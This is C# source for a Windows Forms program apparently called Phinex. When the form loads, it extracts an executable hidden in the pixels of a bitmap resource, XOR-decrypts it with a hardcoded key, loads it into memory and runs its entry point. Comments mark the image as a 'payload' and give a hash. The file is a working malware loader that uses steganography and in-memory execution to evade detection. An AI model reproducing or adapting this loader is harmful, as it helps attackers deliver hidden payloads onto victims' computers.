using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Resources;
using System.Runtime.CompilerServices;
using System.IO;
using System.Reflection;

namespace Phinex
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private static Color getPixel(Bitmap b, int y, int x)
        {
            return b.GetPixel(y, x);
        }


        private static Bitmap getBitmap()
        {
            Bitmap myBmp = Phinex.Properties.Resources._1_dec_exe;		//payload : 073a97a88e7a1512e1a7bbadcab962f4dcedd3f5
            return myBmp;
        }


        private static byte[] decrypt(string key)
        {
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);
            Bitmap bitmap = getBitmap();
            checked
            {
                byte[] array = new byte[bitmap.Width * bitmap.Height * 3];
                int num = 0;
                for (int i = 0; i < bitmap.Height; i++)
                {
                    for (int j = 0; j < bitmap.Width; j++)
                    {
                        //try
                        if (num<bitmap.Height*bitmap.Width)
                        {
                            Color color = getPixel(bitmap, i, j);
                            array[num * 3] = Convert.ToByte(Convert.ToInt32(color.R) ^ Convert.ToInt32(key_bytes[(num*3) %key_bytes.Length]));
                            array[num * 3 + 1] = Convert.ToByte(Convert.ToInt32(color.G) ^ Convert.ToInt32(key_bytes[(num *3+1) % key_bytes.Length]));
                            array[num * 3 + 2] = Convert.ToByte(Convert.ToInt32(color.B) ^ Convert.ToInt32(key_bytes[(num *3+2) % key_bytes.Length]));
                            num++;
                        }
                    }
                }
                return array;
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            string key = "RZ8DGTE2Cmb1qngtwdMkF5Lx9yJSjYriX0H46KfBQs";
            byte[] rawAssembly = decrypt(key);
            //FileStream fs = new FileStream("payload.bin", FileMode.Create);
            //BinaryWriter bw = new BinaryWriter(fs);
            //bw.Write(buffer);
            //bw.Close();
            //fs.Close();
            //MessageBox.Show("Decrypted file: payload.bin", "Decrypted!");
			//payload : 073a97a88e7a1512e1a7bbadcab962f4dcedd3f5
			
            Assembly assembly = Assembly.Load(rawAssembly);
            MethodInfo entryPoint = assembly.EntryPoint;
            object obj = assembly.CreateInstance(entryPoint.Name);
            entryPoint.Invoke(obj, null);
        }
    }
}
